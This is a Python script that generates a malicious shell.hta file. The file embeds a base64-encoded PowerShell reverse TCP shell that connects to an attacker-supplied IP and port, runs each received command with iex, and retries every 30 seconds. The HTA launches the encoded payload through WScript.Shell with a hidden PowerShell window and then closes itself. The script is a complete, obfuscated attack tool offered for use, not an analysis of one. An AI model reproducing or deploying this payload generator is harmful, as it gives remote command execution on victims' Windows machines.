#!/usr/bin/env python3

import base64
import sys


def Main():
    if len(sys.argv) < 3:
        print(f"{sys.argv[0]} ip port")
        sys.exit()

    def reverse_shell(ip, port):
        #https://forums.hak5.org/topic/39754-reverse-tcp-shell-using-ms-powershell-only/
        rev_b64 = "IHdoaWxlICgxIC1lcSAxKQp7CiAgICAkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ0NvbnRpbnVlJzsKICAgIHRyeQogICAgewogICAgICAgICRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoIlNVUEVSSVBBIiwgUE9SVCk7CiAgICAgICAgJHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7CiAgICAgICAgW2J5dGVbXV0kYnl0ZXMgPSAwLi4yNTV8JXswfTsKICAgICAgICAkc2VuZGJ5dGVzID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCJDbGllbnQgQ29ubmVjdGVkLi4uIisiYG5gbiIgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiKTsKICAgICAgICAkc3RyZWFtLldyaXRlKCRzZW5kYnl0ZXMsMCwkc2VuZGJ5dGVzLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpOwogICAgICAgIHdoaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCkKICAgICAgICB7CiAgICAgICAgICAgICRyZWNkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOwogICAgICAgICAgICBpZigkcmVjZGF0YS5TdGFydHNXaXRoKCJraWxsLWxpbmsiKSl7IGNsczsgJGNsaWVudC5DbG9zZSgpOyBleGl0O30KICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICNhdHRlbXB0IHRvIGV4ZWN1dGUgdGhlIHJlY2VpdmVkIGNvbW1hbmQKICAgICAgICAgICAgICAgICRzZW5kYmFjayA9IChpZXggJHJlY2RhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTsKICAgICAgICAgICAgICAgICRzZW5kYmFjazIgID0gJHNlbmRiYWNrICsgIlBTICIgKyAocHdkKS5QYXRoICsgIj4gIjsKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkZXJyb3JbMF0uVG9TdHJpbmcoKSArICRlcnJvclswXS5JbnZvY2F0aW9uSW5mby5Qb3NpdGlvbk1lc3NhZ2U7CiAgICAgICAgICAgICAgICAkc2VuZGJhY2syICA9ICAiRVJST1I6ICIgKyAkZXJyb3JbMF0uVG9TdHJpbmcoKSArICJgbmBuIiArICJQUyAiICsgKHB3ZCkuUGF0aCArICI+ICI7CiAgICAgICAgICAgICAgICBjbHM7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJHJldHVybmJ5dGVzID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOwogICAgICAgICAgICAkc3RyZWFtLldyaXRlKCRyZXR1cm5ieXRlcywwLCRyZXR1cm5ieXRlcy5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKTsgICAgICAgICAgCiAgICAgICAgfQogICAgfQogICAgY2F0Y2ggCiAgICB7CiAgICAgICAgaWYoJGNsaWVudC5Db25uZWN0ZWQpCiAgICAgICAgewogICAgICAgICAgICAkY2xpZW50LkNsb3NlKCk7CiAgICAgICAgfQogICAgICAgIGNsczsKICAgICAgICBTdGFydC1TbGVlcCAtcyAzMDsKICAgIH0gICAgIAp9IAo="
        rev_plain = base64.b64decode(rev_b64).decode()
        rev = rev_plain.replace("SUPERIPA" , ip).replace("PORT", port)
        payload = base64.b64encode(rev.encode('UTF-16LE')).decode()
        return payload
    
    def hta(payload):
        hta_b64 = "PGh0bWw+CjxoZWFkPgoKPEhUQTpBUFBMSUNBVElPTiBpZD0id2VpcmRodGEiCmFwcGxpY2F0aW9uTmFtZT0id2VpcmRodGEiCmJvcmRlcj0idGhpbiIKYm9yZGVyU3R5bGU9Im5vcm1hbCIKY2FwdGlvbj0ieWVzIgppY29uPSJodHRwOi8vMTI3LjAuMC4xL2Zhdmljb24uaWNvIgptYXhpbWl6ZUJ1dHRvbj0ieWVzIgptaW5pbWl6ZUJ1dHRvbj0ieWVzIgpzaG93SW5UYXNrYmFyPSJubyIKd2luZG93U3RhdGU9Im5vcm1hbCIKaW5uZXJCb3JkZXI9InllcyIKbmF2aWdhYmxlPSJ5ZXMiCnNjcm9sbD0iYXV0byIKc2Nyb2xsRmxhdD0ieWVzIgpzaW5nbGVJbnN0YW5jZT0ieWVzIiAKc3lzTWVudT0ieWVzIgpjb250ZXh0TWVudT0ieWVzIgpzZWxlY3Rpb249InllcyIgCnZlcnNpb249IjEuMCIgLz4KCjxzY3JpcHQ+CmE9bmV3IEFjdGl2ZVhPYmplY3QoIldTY3JpcHQuU2hlbGwiKTsKYS5ydW4oInBvd2Vyc2hlbGwuZXhlIC1ub3AgLXcgMSAtZW5jIEJBU0U2NCIsIDApO3dpbmRvdy5jbG9zZSgpOwo8L3NjcmlwdD4KPHRpdGxlPldlaXJkIFRpdGxlPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KPGgxPldFSVJEIEhUQTwvaDE+Cjxocj4KPC9ib2R5Pgo8L2h0bWw+Cgo="
        hta_plain = base64.b64decode(hta_b64).decode()
        hta = hta_plain.replace("BASE64" ,payload)
        with open("shell.hta",'w',encoding = 'utf-8') as f:
            f.write(hta)
            f.close()
        print("[*] Written shell.hta")

    payload = reverse_shell(sys.argv[1], sys.argv[2])
    hta(payload)

if __name__ == "__main__":
    Main()
